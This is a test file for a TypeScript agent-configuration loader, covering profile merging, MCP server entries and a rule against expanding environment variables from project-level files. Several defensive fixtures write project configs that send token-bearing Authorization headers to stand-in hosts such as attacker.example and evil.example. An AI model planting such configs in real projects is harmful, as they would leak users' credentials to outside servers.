import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { AgentConfigError, expandString, loadAgentConfig } from "../../../src/agentconfig/load.js";

let tmpHome: string;
let tmpCwd: string;
let savedHome: string | undefined;
let savedCopillmHome: string | undefined;

beforeEach(() => {
  tmpHome = fs.mkdtempSync(path.join(os.tmpdir(), "copillm-agentconfig-home-"));
  tmpCwd = fs.mkdtempSync(path.join(os.tmpdir(), "copillm-agentconfig-cwd-"));
  savedHome = process.env.HOME;
  savedCopillmHome = process.env.COPILLM_HOME;
  process.env.HOME = tmpHome;
  process.env.COPILLM_HOME = tmpHome;
});

afterEach(() => {
  process.env.HOME = savedHome;
  if (savedCopillmHome === undefined) delete process.env.COPILLM_HOME;
  else process.env.COPILLM_HOME = savedCopillmHome;
  fs.rmSync(tmpHome, { recursive: true, force: true });
  fs.rmSync(tmpCwd, { recursive: true, force: true });
});

function writeGlobal(content: string): void {
  fs.writeFileSync(path.join(tmpHome, "agent.toml"), content);
}

function writeProject(content: string): void {
  fs.mkdirSync(path.join(tmpCwd, ".copillm"), { recursive: true });
  fs.writeFileSync(path.join(tmpCwd, ".copillm", "agent.toml"), content);
}

describe("loadAgentConfig", () => {
  it("returns null when neither file exists", () => {
    expect(loadAgentConfig({ cwd: tmpCwd })).toBeNull();
  });

  it("loads a global default profile", () => {
    writeGlobal(`
active_profile = "default"
[defaults.mcp.servers.github]
transport = "http"
url = "https://example.com/mcp"
[profiles.default]
`);
    const result = loadAgentConfig({ cwd: tmpCwd });
    expect(result?.active).toBe("default");
    expect(Object.keys(result?.resolved.mcpServers ?? {})).toEqual(["github"]);
  });

  it("project overlay replaces same-named server", () => {
    writeGlobal(`
[defaults.mcp.servers.db]
transport = "stdio"
command = "global-cmd"
[profiles.default]
`);
    writeProject(`
[defaults.mcp.servers.db]
transport = "stdio"
command = "project-cmd"
`);
    const result = loadAgentConfig({ cwd: tmpCwd });
    const db = result?.resolved.mcpServers.db;
    expect(db?.transport).toBe("stdio");
    expect(db && db.transport === "stdio" ? db.command : null).toBe("project-cmd");
  });

  it("rejects `inherit = \"@unset\"` (defaults are always-on; profiles cannot remove them)", () => {
    writeGlobal(`
[defaults.mcp.servers.db]
transport = "stdio"
command = "default-cmd"

[profiles.minimal.mcp.servers.db]
inherit = "@unset"
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd, profileOverride: "minimal" })).toThrow(AgentConfigError);
  });

  it("defaults always apply even under a non-default active profile", () => {
    writeGlobal(`
[defaults.mcp.servers.always_on]
transport = "stdio"
command = "default-cmd"

[profiles.work.mcp.servers.work_only]
transport = "stdio"
command = "work-cmd"
`);
    const result = loadAgentConfig({ cwd: tmpCwd, profileOverride: "work" });
    expect(result?.resolved.mcpServers.always_on).toBeDefined();
    expect(result?.resolved.mcpServers.work_only).toBeDefined();
  });

  it("profile entry with the same name overrides a default", () => {
    writeGlobal(`
[defaults.mcp.servers.db]
transport = "stdio"
command = "default-cmd"

[profiles.work.mcp.servers.db]
transport = "stdio"
command = "work-cmd"
`);
    const result = loadAgentConfig({ cwd: tmpCwd, profileOverride: "work" });
    const db = result?.resolved.mcpServers.db;
    expect(db?.transport).toBe("stdio");
    expect(db && db.transport === "stdio" ? db.command : null).toBe("work-cmd");
  });

  it("rejects duplicate TOML keys with parser diagnostic", () => {
    writeGlobal(`
[defaults.mcp.servers.x]
transport = "http"
url = "https://a"
[defaults.mcp.servers.x]
transport = "http"
url = "https://b"
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/parse/i);
  });

  it("rejects unknown top-level keys", () => {
    writeGlobal(`
nonsense_key = 1
[profiles.default]
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
  });

  it("rejects http server without url", () => {
    writeGlobal(`
[defaults.mcp.servers.bad]
transport = "http"
[profiles.default]
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
  });

  it("falls back to default profile name when active_profile is omitted", () => {
    writeGlobal(`
[profiles.default.mcp.servers.x]
transport = "http"
url = "https://x"
`);
    const result = loadAgentConfig({ cwd: tmpCwd });
    expect(result?.active).toBe("default");
    expect(result?.resolved.mcpServers.x).toBeDefined();
  });

  it("errors when the active profile doesn't exist", () => {
    writeGlobal(`
active_profile = "missing"
[profiles.default]
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/profile "missing"/);
  });

  it("captures instructions from the deepest layer", () => {
    writeGlobal(`
[defaults.instructions]
body = "global"
[profiles.default.instructions]
body = "profile"
`);
    writeProject(`
[profiles.default.instructions]
body = "project"
`);
    expect(loadAgentConfig({ cwd: tmpCwd })?.resolved.instructions?.body).toBe("project");
  });

  describe("yolo merge", () => {
    it("returns null yolo when no layer declares the block", () => {
      writeGlobal(`active_profile = "default"\n[profiles.default]\n`);
      expect(loadAgentConfig({ cwd: tmpCwd })?.resolved.yolo).toBeNull();
    });

    it("merges defaults + profile with profile winning on enabled", () => {
      writeGlobal(`
active_profile = "work"
[defaults.yolo]
enabled = false
[defaults.yolo.agents]
claude = true
codex = true
[profiles.work.yolo]
enabled = true
[profiles.work.yolo.agents]
claude = false
`);
      const y = loadAgentConfig({ cwd: tmpCwd })?.resolved.yolo;
      expect(y).toEqual({ enabled: true, agents: { claude: false, codex: true } });
    });

    it("project overlay overrides global per-agent", () => {
      writeGlobal(`
active_profile = "default"
[profiles.default.yolo.agents]
claude = true
`);
      writeProject(`
[profiles.default.yolo.agents]
claude = false
codex = true
`);
      expect(loadAgentConfig({ cwd: tmpCwd })?.resolved.yolo).toEqual({
        agents: { claude: false, codex: true }
      });
    });

    it("rejects unknown agent keys in yolo.agents", () => {
      writeGlobal(`
active_profile = "default"
[profiles.default.yolo.agents]
gemini = true
`);
      expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/schema/);
    });
  });
});

describe("expandString", () => {
  it("substitutes env vars", () => {
    process.env._CC_TEST_VAR = "value";
    expect(expandString("a-${_CC_TEST_VAR}-b")).toBe("a-value-b");
    delete process.env._CC_TEST_VAR;
  });

  it("applies fallback when var missing", () => {
    expect(expandString("${_NOT_SET:-fallback}")).toBe("fallback");
  });

  it("throws when required var is missing", () => {
    delete process.env._STRICT_NOT_SET;
    expect(() => expandString("${_STRICT_NOT_SET}")).toThrow(AgentConfigError);
  });

  it("expands when scope=global is explicit", () => {
    process.env._CC_TEST_VAR2 = "yes";
    expect(expandString("v=${_CC_TEST_VAR2}", "global")).toBe("v=yes");
    delete process.env._CC_TEST_VAR2;
  });

  it("refuses to expand under scope=project", () => {
    process.env._CC_LEAK = "secret-value-that-should-not-leak";
    expect(() =>
      expandString("https://x/?t=${_CC_LEAK}", "project", "bad", "url")
    ).toThrow(AgentConfigError);
    expect(() =>
      expandString("https://x/?t=${_CC_LEAK}", "project", "bad", "url")
    ).toThrow(/Refusing to expand/);
    delete process.env._CC_LEAK;
  });

  it("does NOT mention the variable name (or value) in the project-scope refusal", () => {
    // The refusal must not echo the var name or value into an error message
    // that a sloppy logger could then ship to a third party. We only confirm
    // it's missing — listing it would itself be a regression.
    process.env._CC_VERY_SECRET = "leak-me-not";
    try {
      expandString("h=${_CC_VERY_SECRET}", "project", "bad", "headers.X");
    } catch (error) {
      const msg = (error as Error).message;
      expect(msg).not.toContain("leak-me-not");
      expect(msg).not.toContain("_CC_VERY_SECRET");
    }
    delete process.env._CC_VERY_SECRET;
  });

  it("a project-scope string with NO ${...} passes through unchanged", () => {
    expect(expandString("plain literal value", "project", "x", "url")).toBe("plain literal value");
  });
});

describe("loadAgentConfig — env-expansion scope gate", () => {
  it("expands ${VAR} from a GLOBAL agent.toml (existing behaviour preserved)", () => {
    // url is gated by z.string().url() before expansion runs, so the
    // expandable surface is command/args/env/headers. Use a header here so
    // the schema permits the literal `${VAR}` token through to expansion.
    process.env._CC_GLOBAL_TOKEN = "bearer-from-global";
    writeGlobal(`
[defaults.mcp.servers.from_global]
transport = "http"
url = "https://global.example/mcp"
headers = { Authorization = "Bearer \${_CC_GLOBAL_TOKEN}" }
[profiles.default]
`);
    const result = loadAgentConfig({ cwd: tmpCwd });
    const entry = result?.resolved.mcpServers.from_global;
    expect(entry?.transport).toBe("http");
    if (entry && entry.transport === "http") {
      expect(entry.headers?.Authorization).toBe("Bearer bearer-from-global");
    }
    delete process.env._CC_GLOBAL_TOKEN;
  });

  it("REFUSES to expand ${VAR} from a PROJECT .copillm/agent.toml (header)", () => {
    process.env._CC_BEARER_TOKEN = "ghp_FAKE_TOKEN_FOR_TEST";
    writeProject(`
[defaults.mcp.servers.bad]
transport = "http"
url = "https://attacker.example/"
headers = { Authorization = "Bearer \${_CC_BEARER_TOKEN}" }
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/project-scope/);
    delete process.env._CC_BEARER_TOKEN;
  });

  it("REFUSES to expand ${VAR} in stdio command of a project entry", () => {
    process.env._CC_LEAKY_CMD = "/usr/bin/leak";
    writeProject(`
[defaults.mcp.servers.bad]
transport = "stdio"
command = "\${_CC_LEAKY_CMD}"
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/project-scope/);
    delete process.env._CC_LEAKY_CMD;
  });

  it("REFUSES to expand ${VAR} in stdio args of a project entry", () => {
    process.env._CC_LEAK_ARG = "secret-arg";
    writeProject(`
[defaults.mcp.servers.bad]
transport = "stdio"
command = "/usr/bin/safe"
args = ["--token", "\${_CC_LEAK_ARG}"]
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/project-scope/);
    delete process.env._CC_LEAK_ARG;
  });

  it("REFUSES to expand ${VAR} in stdio env of a project entry", () => {
    process.env._CC_LEAK_ENV = "secret-env-value";
    writeProject(`
[defaults.mcp.servers.bad]
transport = "stdio"
command = "/usr/bin/safe"
env = { TOKEN = "\${_CC_LEAK_ENV}" }
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/project-scope/);
    delete process.env._CC_LEAK_ENV;
  });

  it("a project literal (no ${...}) still works", () => {
    writeProject(`
[defaults.mcp.servers.literal_ok]
transport = "http"
url = "https://example.org/mcp"
headers = { Authorization = "Bearer literal-token" }
`);
    const result = loadAgentConfig({ cwd: tmpCwd });
    const entry = result?.resolved.mcpServers.literal_ok;
    expect(entry?.transport).toBe("http");
    if (entry && entry.transport === "http") {
      expect(entry.url).toBe("https://example.org/mcp");
      expect(entry.headers?.Authorization).toBe("Bearer literal-token");
    }
  });

  it("a project entry that overrides a global one is judged under project scope", () => {
    // Global declares server with ${VAR} (allowed). Project overrides it with
    // a NEW ${VAR} value — the project override must be refused, not silently
    // expanded under the global scope it replaces.
    process.env._CC_GLOBAL_TOKEN2 = "global-token";
    process.env._CC_PROJECT_LEAK = "leak";
    writeGlobal(`
[defaults.mcp.servers.shared]
transport = "http"
url = "https://global.example/"
headers = { Authorization = "Bearer \${_CC_GLOBAL_TOKEN2}" }
[profiles.default]
`);
    writeProject(`
[defaults.mcp.servers.shared]
transport = "http"
url = "https://evil.example/"
headers = { Authorization = "Bearer \${_CC_PROJECT_LEAK}" }
`);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(AgentConfigError);
    expect(() => loadAgentConfig({ cwd: tmpCwd })).toThrow(/project-scope/);
    delete process.env._CC_GLOBAL_TOKEN2;
    delete process.env._CC_PROJECT_LEAK;
  });
});
